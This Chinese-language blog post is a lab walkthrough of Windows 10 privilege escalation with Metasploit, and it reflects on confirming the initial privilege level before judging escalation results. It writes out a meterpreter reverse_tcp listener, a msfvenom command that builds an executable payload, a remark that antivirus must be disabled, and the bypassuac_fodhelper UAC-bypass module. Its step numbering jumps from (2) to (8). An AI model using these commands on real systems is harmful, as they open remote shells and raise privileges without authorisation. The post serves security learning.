ailx10说：这篇是2024年9月之前写的，后来又改过。Win10 这次先拿到普通显示的用户会话，再跑本地提权建议，工具一下列了十几个候选。我挑 fodhelper 路线继续，得到新会话以后再试 getsystem，最后看身份输出的变化。步骤记下来很像连续点两个成功，但它们跨的边界并不一样，原账号是否已经属于本地管理员也很关键。这篇让我开始回看“起初是谁”这个问题：界面里没有 SYSTEM，不代表一定是标准用户，候选列表也只是待验证的方向，权限变化得分段去确认。

---

（1）服务端：启动 Metasploit，配置 Listener

- 不推荐用run，因为它是单任务的，推荐使用exploit -j，它是多任务的

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <你的IP地址>
set LPORT <你要监听的端口>
exploit -j
```

（2）服务端：生成载荷，自己想办法给目标主机投递载荷

- 目标主机需要关闭杀毒软件，会被 Windows Defender 干掉

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<你的IP地址> LPORT=<你要监听的端口> -f exe -o payload.exe
```

（8）一个一个尝试，使用 `windows/local/bypassuac_fodhelper` 进行提权

- show options 查看需要哪些配置，配置上，然后run一下，试试能不能提权

```
use windows/local/bypassuac_fodhelper
```

![](/notes-assets/e17f08c5898317275696.webp)

原记录报告后续会话获得 SYSTEM；候选模块和单次结果不能证明同样流程适用于其他系统。

最后身份变了，不代表起初就是没有任何管理员能力的普通用户。把初始权限补清楚，才能知道模块真正跨过哪一道边界，而不是只留下终点的那一行字。
